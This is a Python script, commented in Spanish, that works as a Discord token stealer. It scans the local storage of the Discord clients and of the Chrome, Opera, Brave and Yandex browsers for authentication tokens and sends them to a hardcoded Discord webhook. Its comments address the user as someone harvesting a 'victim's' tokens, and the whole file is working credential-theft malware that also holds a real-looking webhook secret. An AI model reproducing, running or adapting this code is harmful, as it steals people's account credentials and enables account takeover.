import os
import re
import json
from urllib.request import Request, urlopen
 
# Tu webhook url
WEBHOOK_URL = 'https://discord.com/api/webhooks/1141191834907983913/GAVfcsaS2V9qxzNj8qs17GK0fh2Scy9Va7UisXsKMb9qPx3EY-FjHf9dCiqdXlOaJ7-z'
 
# te menciona cuando consigues los tokens de tu victima
MENCIONAME = False
 
def find_tokens(path):
    path += '\\Local Storage\\leveldb'
 
    tokens = []
 
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
 
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
 
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
 
    if local is None or roaming is None:
        print("No se encontraron las variables de entorno LOCALAPPDATA o APPDATA.")
        return
 
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
 
    message = '@here' if MENCIONAME else ''
 
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
 
        message += f'\n**{platform}**\n```\n'
 
        tokens = find_tokens(path)
 
        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No se han encontrado tokens.\n'
 
        message += '```'
 
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
 
    payload = json.dumps({'content': message})
 
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
        print("Tokens enviados a la webhook exitosamente.")
    except:
        print("Ocurrió un error al enviar los tokens a la webhook.")
 
if __name__ == '__main__':
    main()
